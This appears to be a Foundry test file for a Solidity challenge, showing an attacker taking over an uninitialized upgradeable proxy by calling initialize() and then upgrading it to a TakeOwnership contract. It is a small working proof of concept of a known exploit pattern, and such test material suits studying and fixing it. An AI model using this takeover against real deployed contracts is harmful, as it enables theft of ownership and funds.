// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {DasProxy} from "../../src/proxy/DasProxy.sol";
import {Impl} from "../../src/proxy/Impl.sol";
import {TakeOwnership} from "./TakeOwnership.sol";

contract ProxyTest is Test {
    DasProxy public proxy;
    Impl public impl;

    address public user = address(123);
    address public attacker = address(456);

    function setUp() public {
        vm.prank(user);
        impl = new Impl();
        vm.prank(user);
        proxy = new DasProxy(address(impl), "");
    }

    function testProxyIsNotInitialized() public {
        (bool validResponse, bytes memory returnedData) = address(proxy).call(
            abi.encodeWithSignature("owner()")
        );
        assertTrue(validResponse);
        address owner = abi.decode(returnedData, (address));

        assertEq(owner, address(0), "!owner");
        assertEq(impl.owner(), user, "!owner");
    }

    function testTaskFlow() public {
        (bool validResponse, bytes memory returnedData) = address(proxy).call(
            abi.encodeWithSignature("initialize()")
        );
        assertTrue(validResponse);
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("owner()")
        );
        assertTrue(validResponse);
        address owner = abi.decode(returnedData, (address));
        assertEq(owner, address(this));

        // attacker can call initialize
        vm.prank(attacker);
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("initialize()")
        );
        assertTrue(validResponse);
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("owner()")
        );
        assertTrue(validResponse);
        owner = abi.decode(returnedData, (address));
        assertEq(owner, attacker);

        // attacker can call upgrade
        vm.prank(attacker);
        TakeOwnership takeOwnership = new TakeOwnership();
        vm.prank(attacker);
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("upgradeTo(address)", address(takeOwnership))
        );
        assertTrue(validResponse);

        // cannot initalize
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("initialize()")
        );
        assertFalse(validResponse);
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("owner()")
        );
        assertTrue(validResponse);
        owner = abi.decode(returnedData, (address));
        // owner is still attacker
        assertEq(owner, attacker);

        // cannot upgrade proxy impl
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("upgradeTo(address)", address(impl))
        );
        assertFalse(validResponse);
    }
}
